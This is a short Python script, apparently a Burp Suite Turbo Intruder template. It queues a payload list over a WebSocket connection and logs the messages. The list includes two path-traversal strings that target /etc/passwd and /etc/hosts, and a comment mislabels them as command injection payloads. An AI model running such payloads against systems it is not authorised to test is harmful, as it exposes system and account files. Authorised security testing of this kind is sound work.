import time

# Define command injection payloads
payloads = [
        "toys",
        "games",
        "books",
        "disks",
        "../../../../../../../../etc/hosts",
        "../../../../../../../../etc/passwd"
    ]

def queue_websockets(upgrade_request, message):
    connection1 = websocket_connection.create(upgrade_request, Engine.BURP)
    for payload in payloads:
        connection1.queue(message, payload)


def handle_outgoing_message(websocket_message, interesting):
    results_table.add(websocket_message)

def handle_incoming_message(websocket_message, interesting):
    if interesting:
        results_table.add(websocket_message)

